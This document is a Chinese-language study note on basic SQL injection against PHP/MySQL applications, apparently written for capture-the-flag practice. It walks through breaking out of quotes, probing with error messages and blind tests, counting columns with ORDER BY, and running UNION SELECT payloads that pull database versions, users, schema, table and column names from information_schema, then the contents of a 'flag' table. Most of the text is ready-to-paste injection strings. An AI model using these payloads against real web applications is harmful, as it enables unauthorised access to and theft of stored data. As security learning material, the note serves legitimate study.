====== 基础注入 ======
Created 星期六 30 十一月 2024

数字型注入：
原理：如php源码：$sql = "select username,password from users where id = ?";
对于 where id = ? 的问号位置，后台常见语句有
$id  '$id'  "$id"  ($id) 
或他们的组合，如("'$id'")
要想办法让符号闭合，这样后面的内容就可以自由构造，最后再加上注释符号--，取消掉原有的右引号。注意分号，视情况添加。

1. 寻找注入点：
通过报错判断后台语句：
试探：1'  1"  '1  "1 等
执行id = "1""，报错near '"1""' at line 1
执行id = '1''，报错near'' 1''' at line 1
执行id = ''1'，报错near '1'' at line 1

无报错时，根据是否有回显判断（盲注）：
执行id=-1 or 1=1 有回显，说明注入点正确
执行id=1 and 1=1 有回显，说明id=1正确
WHERE username='a'or(true)

2. 判断列数：order by <col num>
从1开始尝试增加列号，如果报错说明总列数小于该参数。假设有3列，一般是id, username, password
WHERE id='1' order by 1--+  假设有id=1的列
WHERE id='-1' or 1=1 order by 1--+  假设没有id=-1的列

3. 使用union获取信息：
	union 后面的表列数需要与前面一致，通过添加数字代替不够的列。
	注意select后的列必须跟union前显示的列顺序一致。

查看回显点：通过传入错误id -1，使得结果为union右边的表。根据显示的是1、2、3的哪个决定后续在哪加入查询信息
id=-1' union SELECT 1,2,3 --+

查询数据库信息、连接数据库的"用户名@地址"、当前库名：
union SELECT 1,concat(@@version,@@datadir,user(),database()),3

查询当前库名：
union SELECT 1,database(),3

获取所有数据库名：
union SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata;--+
或
union SELECT 1,group_concat(DISTINCT+table_schema),3 FROM information_schema.columns;--+

获取当前数据库的所有表名：
union SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database();--+
或
union SELECT 1,group_concat(DISTINCT+table_name),3 FROM information_schema.columns WHERE table_schema=database();--+
【同时查多个库：WHERE table_schema in ('xxx','yyy')】

获取指定表的所有列名：
union SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='xxx';--+
【同时查多个表：WHERE table_name in ('xxx','yyy')】 

获取flag表中的flag列：
union select 1,group_concat(flag),3 from flag

字符型注入：
如：SELECT * FROM users WHERE username='$username' AND password='$password' LIMIT 0,1;
输入 username=-1' or 1=1--+ 将后面的password注释掉（也可以用这个办法判断代码里username和password谁先谁后）
后续则相同
